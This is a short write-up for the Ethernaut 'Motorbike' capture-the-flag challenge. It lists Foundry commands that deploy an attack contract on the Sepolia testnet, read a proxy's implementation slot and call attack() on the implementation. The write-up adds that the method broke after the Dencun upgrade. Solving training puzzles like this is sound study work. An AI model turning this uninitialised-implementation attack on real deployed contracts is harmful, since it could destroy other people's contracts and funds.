# Motorbike Solution

Please note that this challenge is not solvable after the Dencun upgrade when creating a new contract instance in the UI. Instead, you need to selfdestruct the contract in the same transaction as its creation.

For a detailed solution, check out https://github.com/Ching367436/ethernaut-motorbike-solution-after-decun-upgrade/.

The below solution worked before the Dencun upgrade and captures the gist of the challenge.

Deploy:

```bash
forge create MotorbikeHack --broadcast --rpc-url $SEPOLIA_RPC_URL --account sepoliaKey
```

Run to retrieve the `implementationAddress`:

```bash
cast storage <instanceAddress> 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc --rpc-url $SEPOLIA_RPC_URL
# 0x0000000000000000000000004e98c3fc59de33449b101d5170d3760d3b7c1701
cast parse-bytes32-address <implementationAddress>
# cast parse-bytes32-address 0x0000000000000000000000004e98c3fc59de33449b101d5170d3760d3b7c1701
# 0x4e98c3FC59de33449B101D5170d3760D3B7c1701
```

Run:

```bash
cast send <motorbikeHackAddress> "attack(address)" <implementationAddress> --rpc-url $SEPOLIA_RPC_URL --account sepoliaKey --gas-limit 1000000
# cast send <motorbikeHackAddress> "attack(address)" 0x4e98c3FC59de33449B101D5170d3760D3B7c1701 --rpc-url $SEPOLIA_RPC_URL --account sepoliaKey --gas-limit 1000000
```
